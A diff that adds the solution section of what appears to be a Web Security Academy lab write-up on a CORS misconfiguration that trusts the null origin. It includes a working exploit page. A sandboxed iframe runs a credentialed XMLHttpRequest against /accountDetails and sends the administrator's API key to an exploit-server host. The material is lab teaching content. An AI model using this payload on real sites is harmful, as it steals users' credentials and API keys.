@@ -71,8 +71,72 @@ xhr.send(null)
 
 # Solving : 
 
+- Like the last lab we will try that it is vulnerable to orbitary origin or not.
 
+<img width="1053" height="354" alt="image" src="https://github.com/user-attachments/assets/54376345-04f4-41ef-9f96-cfcb84cd69ba" />
 
+- We can see it is not accecpting the orbitary origin as can't see that in response.
 
+- lets change the origin to null value and check and we can see the null in the response. 
+
+<img width="1048" height="509" alt="image" src="https://github.com/user-attachments/assets/fefea6b1-08df-4221-aef9-e8ed0c362ad2" />
+
+- As like the last lab we will write a script that will fetch the api key of the admin users.
+
+<html>
+<body>
+<script>
+ var xhr = new XMLHttpRequest();
+var url = "https://0a750050046d0540804e036f0075005b.web-security-academy.net"
+
+xhr.onreadystatechange = function() {
+if(xhr.readyState==XMLHttpRequest.DONE){
+fetch("/log?key=" + xhr.responseText)
+}
+}
+xhr.open('GET', url + "/accountDetails", true);
+xhr.withCredentials =true;
+xhr.send(null)
+
+</script>
+</body>
+</html>
+
+- When we submit this srcipt it won't be get the api key for us that is because it accepts only the null origin. 
+
+<img width="1347" height="359" alt="image" src="https://github.com/user-attachments/assets/a855f1cd-f044-43c4-9f40-ed877b887975" />
+
+- Hence for that we will use the sandbox iframe so it would think that it is coming from the null origin. And we modify the code like following.
+
+<html>
+<body>
+ <iframe style="display: none;"
+  sandbox="allow-scripts" srcdoc="
+<script>
+ var xhr = new XMLHttpRequest();
+var url = 'https://0a750050046d0540804e036f0075005b.web-security-academy.net'
+
+xhr.onreadystatechange = function() {
+if(xhr.readyState==XMLHttpRequest.DONE){
+fetch('https://exploit-0ae8002c046105b78021020501560013.exploit-server.net/log?key=' + xhr.responseText)
+}
+}
+xhr.open('GET', url + '/accountDetails', true);
+xhr.withCredentials = true;
+xhr.send(null);
+
+</script></iframe>
+</body>
+</html>
+
+- We are creating the iframe and sending the script through that so it would look like it is coming from the null origin.
+
+<img width="1329" height="533" alt="image" src="https://github.com/user-attachments/assets/7dda45d7-a6fb-4f0c-bf5b-84b0d87d0ab5" />
+
+- We can see it worked and fetched the api key of administrator user. Hence by submitting the key we will solve the lab. 
+
+<img width="1151" height="657" alt="image" src="https://github.com/user-attachments/assets/899eb39e-65df-455a-8372-7547735a0fe3" />
+
+<img width="1222" height="508" alt="image" src="https://github.com/user-attachments/assets/3fa24293-c4f2-4325-b925-d5ecaf288290" />
 
 # ------------------------------------------------------------------------------
